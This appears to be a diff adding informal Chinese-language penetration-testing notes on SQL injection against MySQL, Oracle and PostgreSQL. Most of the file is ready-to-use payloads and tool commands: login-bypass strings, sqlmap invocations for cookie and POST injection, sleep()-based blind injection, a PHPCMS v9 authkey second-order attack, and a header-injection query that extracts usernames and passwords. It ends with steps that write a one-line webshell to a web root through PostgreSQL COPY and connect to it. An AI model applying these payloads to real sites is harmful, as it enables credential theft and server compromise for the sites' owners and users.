@@ -1,0 +1,126 @@
+mysql函数：
+	1.system_user() 系统用户名
+	2 user()：用户名
+	3current_user当前用户
+	4session_user()：连接数据库的用户名
+	5database()：数据库名
+	6version() ：版本
+	7load_file('c:/1.txt')：转成16进制或者是10进制mysql读取本地文件的函数
+	8@@datadir：读取数据库路径
+	9@@basedir：安装路径
+	10@@version_compile_os:操作系统
+mysql 数据库连接
+	<?php
+	$host='localhost'
+	$database=''
+	$user ='root'
+	$pass=‘’
+	$webml='/0/'
+	?>
+
+注入原理：解释性语言
+
+mysql版本>4.0
+	
+	4.0之前没有infomation_scahme表，所以不能手工注入，可以用sqlmap
+
+mysql 显错注入
+	admin'#    可以把后面的sql注释掉
+	admin ' or '1=1'#
+mysql读写函数
+	union select load_file(filePath)
+
+常见的提交方式：
+	GET:inurl:.asp?id=1
+	当有防注入代码时：
+	POST:data傳參（文件）
+		post提交方式主要是表單提交（登錄框的注入）
+		工具：
+		穿山甲 ：不是很好用post
+		sqlmap：sqlmap -u c:\p.txt      bp获取的数据包保存再p.txt中
+			
+	request：get/post 都接收
+	COOKIE ：cookie 欺騙 登錄-->先用bp抓包，在bp修改参数的位置
+		sqlmap：sqlmap.py -u "注入连接不带参数（get方式被拦截）" --cookie "id=24" --level 2
+	HEAD
+	PUT
+	OPTION
+
+搜索型注入：先用显错注入测试是否存在注入点
+
+伪静态注入：123.html --->123-0.html  返回正常则是伪静态
+	四种常见的伪静态构造方式
+
+延迟注入：（盲注手法）
+	通过页面返回的时间来判断
+	不同mysql版本延时注入语句也不同
+	mysql >=5.0 ---->sleep():http://192.168.1.200:8088/test.php?id=1 and sleep(5) 看效果是否满足5s之后显示
+	mysql<5.0------->benchmark()
+
+二阶注入
+	php v9 cms authkey注入---确定是否是php v9
+	利用exp爆出authkey
+	phpsso_server/index.php?m=phpsso......粘贴至网站根目录下看是否可以爆出authkey
+	中转注入：
+	1本地启用一个站
+	2漏洞利用页面有一个中转页面，copy至phpstudy站点www根目录中修改为php.php
+	3修改url和authkey
+	4sqlmap跑127.0.0.1:99/php.php?id=1
+
+http请求头注入
+	AWVS获取请求包，在每一个参数后面加一个’看是否显错注入
+	记录ip的地方容易出现该bug
+	insert into tablename （param1，param2）values（‘1’，select concat(username,'|'passwoed) from user limt 1）
+xml实体注入
+ 当构造sql类似如此时"SELECT * FROM user WHERE (id='$id')"时
+指定闭合标签：--prefix  ")" --suffix"('abc'='abc'"
+
+app注入漏洞
+	利用抓包工具获取app获取发送包（）
+	具体操作
+		1下载app到手机上
+		2和抓包电脑同一个wifi环境下
+		3设置抓包器的代理ip（并且设置手机app的代理ip）
+		4可以设置抓包器不拦截抓包，将包保存在日志中，有sqlmap来跑
+
+Oracle&&psotResql注入：相对比较少，因为比较安全
+	旅游 学校，物流 ，政府等
+	判断注入: and 1=1   and 1=2
+	判断数据库类型
+		and exists(select * from dual)
+		and exists(select * from user_tables)
+	判断列数：
+		order by 11  返回正常
+		order by 12  返回错误
+	获取数据库版本
+	第二种注入方式						
+		and (select count(*)from admin)<>0返回正常
+postgresql注入		
+	 国外php 喜欢postgresql
+	判断是否是postgresql的方式 ：+and+1::int=1--
+	版本：+and+1=cast(version() as int)--
+	当前用户：and 1 =cast（user||123 as int）
+	版本，用户权限，当前db名称
+	union select null，version() ，current_schema(),current_database()
+	psotgresql 写shell
+	1 url?id=1;create table shell(shell text noy null)
+	创建一句话
+	2 url?id=1;insert into shell values($$一句话木马$$)
+	写入到一个文件中
+	3 url?id=1;copy shell(shell) to '/var/www/html/shell.php';
+	4菜刀连接一句话
+	
+	
+		
+	
+
+
+
+	
+	
+
+	
+	
+	
+
+
